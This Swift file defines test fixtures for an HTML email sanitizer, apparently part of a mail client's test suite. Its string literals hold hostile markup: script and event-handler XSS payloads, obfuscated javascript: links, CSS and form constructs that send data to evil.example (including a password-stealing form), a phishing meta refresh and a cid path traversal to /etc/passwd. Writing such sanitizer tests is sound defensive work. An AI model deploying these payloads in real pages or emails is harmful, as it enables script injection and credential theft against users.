import Foundation

/// Hostile message bodies. Each carries a construct the sanitizer must remove and benign content it must keep.
enum AttackFixtures {
    static let inlineScript = #"<p>Hello</p><script>alert('owned')</script><p>World</p>"#

    static let imgOnError = #"<p>Before</p><img src="cid:logo" onerror="alert(1)" alt="Logo"><p>After</p>"#

    static let javascriptHref = #"<p>Click <a href="javascript:alert(1)">here</a> or <a href="https://good.example/">there</a></p>"#

    static let javascriptHrefObfuscated = "<p><a href=\"jav&#x09;ascript:alert(1)\">tab</a><a href=\" JaVaScRiPt:alert(2)\">case</a></p>"

    static let dataHTMLHref = #"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">open</a><p>Rest</p>"#

    static let dataImageHref = #"<a href="data:image/png;base64,iVBORw0KGgo=">image link</a>"#

    static let svgOnload = #"<p>Logo</p><svg onload="alert(1)" width="10" height="10"><circle cx="5" cy="5" r="4"/><script>alert(2)</script><a xlink:href="javascript:alert(3)"><text>t</text></a></svg><p>Tail</p>"#

    static let svgUse = #"<svg><use href="https://evil.example/sprite.svg#icon"/><image href="https://evil.example/i.png"/></svg><p>kept</p>"#

    static let metaRefresh = #"<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/phish"><title>Title</title></head><body><p>Body text</p></body></html>"#

    static let remoteForm = #"<p>Intro</p><form action="https://evil.example/steal" method="post"><input name="password" type="password"><button type="submit">Send</button></form><p>Outro</p>"#

    static let baseHref = #"<html><head><base href="https://evil.example/"></head><body><a href="https://good.example/">good</a></body></html>"#

    static let cssExfilStyleAttribute = #"<div style="color:red;background:url(https://evil.example/track?x=1);font-weight:bold">Styled</div>"#

    static let cssExfilStyleElement = #"<style>p{color:blue} .a{background-image:url('https://evil.example/t.png')} b{font-weight:bold}</style><p class="a">Text</p>"#

    static let cssImport = #"<style>@import url(https://evil.example/x.css); @import "https://evil.example/y.css"; p{color:green}</style><p>Hi</p>"#

    static let cssExpression = #"<div style="width:expression(alert(1));color:red">x</div><div style="behavior:url(x.htc);-moz-binding:url(https://evil.example/x.xml#a);color:blue">y</div>"#

    static let cssPositionFixed = #"<div style="position:fixed;top:0;left:0;color:red">overlay</div><style>.o{position: FIXED;color:green}</style>"#

    static let cidTraversal = #"<p>pic</p><img src="cid:../../../etc/passwd" alt="x"><img src="cid:a/b" alt="y"><p>end</p>"#

    static let srcsetRemote = #"<img src="cid:logo" srcset="https://evil.example/1x.png 1x, https://evil.example/2x.png 2x" sizes="100vw"><p>after</p>"#

    static let iframeSrcdoc = "<p>A</p><iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\" src=\"https://evil.example/\"></iframe><p>B</p>"

    static let objectEmbed = #"<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf"><applet code="x"></applet><math><mi>x</mi></math><p>ok</p>"#

    static let eventHandlersMixedCase = #"<p OnClick="alert(1)" ONMOUSEOVER="x()" style="color:red">text</p>"#

    static let idCollision = ##"<div id="shell">x</div><div id="ss-shell">y</div><a href="#shell">go</a><style>#shell{color:red}</style>"##

    static let spoofedShellMarkup = #"<img src="cid:a" data-ss-src="https://evil.example/t.gif"><div class="ss-quote other" data-ss-collapsed="true">hidden</div>"#

    static let deepNesting: String = {
        String(repeating: "<div>", count: 600) + "deep" + String(repeating: "</div>", count: 600)
    }()
}
